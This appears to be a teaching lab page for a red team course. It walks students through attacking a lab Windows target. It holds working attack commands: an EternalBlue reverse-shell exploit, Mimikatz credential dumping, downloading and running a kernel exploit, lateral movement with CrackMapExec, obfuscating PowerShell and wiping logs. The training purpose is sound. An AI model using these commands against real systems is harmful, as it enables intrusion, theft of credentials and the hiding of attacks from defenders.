---
title: "Red Team Simulation & Adversarial Tactics Lab"
description: "Simulate a cyberattack using real-world adversarial tactics, including privilege escalation, lateral movement, and evasion."
date: 2025-03-08
tags: ["Red Team", "Lateral Movement", "Privilege Escalation", "Adversarial Simulation"]
categories: ["Advanced Security & Penetration Testing"]
draft: false
---

# Red Team Simulation & Adversarial Tactics Lab

## **Overview**
This lab focuses on **offensive security techniques** used by adversaries to **compromise systems, escalate privileges, and move laterally** in a network. Students will use real-world tools to simulate cyberattacks in a controlled environment.

---

## **Lab Instructions**

### **1. Setting Up Your Red Team Environment**
You will need:
- A **Kali Linux VM** (or Parrot Security OS)
- A **Windows Attack Target** (Windows 10/11 VM or Active Directory lab)
- Preinstalled tools: `Metasploit`, `BloodHound`, `Sliver`, `CrackMapExec`

---

### **2. Gaining Initial Access**
#### **Step 1: Exploit a Remote Service (Metasploit)**
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [target_ip]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [attacker_ip]
exploit
```
📝 **Proof of Completion**: Take a screenshot of a successful session.

#### **Step 2: Credential Dumping with Mimikatz**
```powershell
mimikatz
privilege::debug
sekurlsa::logonpasswords
```
📝 **Proof of Completion**: Extract a set of credentials from the target machine.

---

### **3. Privilege Escalation**
#### **Step 1: Check for Misconfigurations**
```bash
whoami /priv
```
```bash
wmic qfe list brief | findstr "KB"  # Look for missing patches
```

#### **Step 2: Exploit a Kernel Vulnerability**
```bash
wget https://exploit-db.com/some_kernel_exploit.c -O exploit.c
gcc exploit.c -o exploit
./exploit
```
📝 **Proof of Completion**: Capture proof of administrator/system privileges.

---

### **4. Lateral Movement**
#### **Step 1: Enumerate Network Shares**
```bash
smbclient -L \\[target_ip] -U user
```
```bash
net use Z: \\[target_ip]\C$ /user:admin password
```
📝 **Proof of Completion**: Map a network share.

#### **Step 2: Move Laterally Using CrackMapExec**
```bash
crackmapexec smb [target_subnet] -u user -p password --exec "whoami"
```
📝 **Proof of Completion**: Show lateral movement to another machine.

---

### **5. Evading Detection**
#### **Step 1: Obfuscate PowerShell Scripts**
```powershell
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("powershell -c Invoke-Mimikatz"))
write-output $encoded
```
📝 **Proof of Completion**: Show your obfuscated PowerShell command.

#### **Step 2: Hide Your Tracks**
```powershell
Remove-Item -Path "C:\Windows\Temp\malware.exe" -Force
```
```bash
echo "" > ~/.bash_history
```
📝 **Proof of Completion**: Show a clean command history.

---

## **Final Submission**
- Submit a **Google Doc** with:
  - **Screenshots** of each phase (**initial access, privilege escalation, lateral movement, and evasion**).
  - A **short write-up** explaining each step.
- Ensure all steps are properly documented.

🚀 **Congratulations! You've completed the Red Team Simulation & Adversarial Tactics Lab!** 🚀

